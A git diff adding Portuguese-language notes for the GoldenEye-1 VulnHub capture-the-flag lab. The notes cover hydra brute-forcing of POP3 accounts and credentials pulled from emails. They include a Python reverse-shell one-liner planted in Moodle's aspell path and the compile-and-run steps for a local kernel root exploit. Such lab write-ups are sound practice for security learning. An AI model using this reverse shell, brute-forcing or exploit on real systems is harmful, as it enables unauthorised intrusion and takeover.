@@ -10,7 +10,8 @@ Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/
 Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download
 Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
 Desafio 11 - vulnhub.com/entry/goldeneye-1,240/
-Desafio 12 -
+Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/
+Desafio 13 - 
 --VM--
   
 Dia 1 - desafio 2(1° desafio)     7/9/2020
@@ -274,3 +275,112 @@ Dia 10			16/9/2020
 		
 		
 		
+		
+Dia 11 			17/9/2020
+
+	*scan padrão
+		porta 80
+			inpecionar página/visualizar origem pagina -> script js -> terminal.js
+				password criptografada url
+					burp decoder
+						InvincibleHack3r
+		
+	*scan -p-
+		pop3 55007
+			nc 192.168.0.x 55007
+				USER boris
+				PASS InvincibleHack3r
+					senha errada, user existe
+					
+		*hydra -l (user) -P (senhas-wordlist) 192.168.0.x (-s (porta) sem o -s ele roda na porta padrão) pop3 (protocolo)
+			password: secret1!
+				nc 192.168.0.x 55007
+				user boris
+				pass secret1!
+					
+						pop3
+							list -> lista emails
+							retr x -> ler email	-> retr 2 -> natalya
+							
+				hydra -l  natalya -P (senhas-wordlist) 192.168.0.x -s 55007 pop3 
+					pass: bird
+					
+				nc 192.168.0.x 55007
+				user natalya
+				pass bird
+					
+				retr 2 
+					user: xenia
+					pass: RCP90rulez!
+					
+					adcionar ao /etc/host 
+						192.168.100.14	severnaya-station.com 
+							http://severnaya-station.com/gnocertdir/
+								user: xenia
+								pass: RCP90rulez!
+								
+								my profile -> messages -> Dr Doak
+									 hydra -l  doak -P /usr/share/wordlist/fasttrack.txt 192.168.0.x -s 55007 pop3
+									pass: goat
+										nc 192.168.0.x 55007
+										user doak
+										pass goat
+											list
+											retr x
+												
+												user: dr_doak
+												pass: 4England!
+											
+								logout moodle
+								novo login
+									user: dr_doak
+									pass: 4England!
+										my profile -> my private files -> s3cret.txt
+											
+											http://severnaya-station.com/dir007key/for-007.jpg
+											salvar imagem
+					*strings imagem/exiftool imagem
+						
+					echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d 
+					
+						moodle
+						user: admin
+						pass: xWinter1995x!
+						
+							site administrator -> plugin ->text editor -> tynyMCE html editor 
+								Spell engine = PSpellShell
+								
+							site administrator -> server -> system paths
+								path to aspell ->  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+								
+					editar ip e porta
+
+				nc -lnvp 443
+
+				*moodle
+					Home -> My profile -> Blogs -> Add a new entry
+
+						escrever qualquer coisakasdasfosjdjoas
+						clicar em Toggle spellchecker -> opção inferior dirito do menu de opções “ABC” para chamar o spell
+
+			uname -a
+
+			kali-> searchsploit linux 3.13
+				/usr/share/exploitdb/exploits/linux/local/37292.c
+
+				compilar o arquivo -> gcc -o data 37292.c (compilou 37292.c pra data)
+
+					transferir para a maquina alvo
+						python -m SimpleHTTPServer 8080
+						m_alvo -> wget ip_kali:8080/37292.c
+
+						chmod +x data -> pra execução
+						./data  -> vai dar erro pois n tem o gcc  pra compilar, porém em /usr/bin existe o cc que também serve pra compilar
+																			
+					editar o 37292.c pois esta referenciando a lib do gcc
+						vim datanovo -> linha 143 , tirar o gcc e por cc											
+
+						mandar pro alvo
+							compilar -> cc -o datanovo 37292.c
+								executar -> ./datanovo
+								root :)
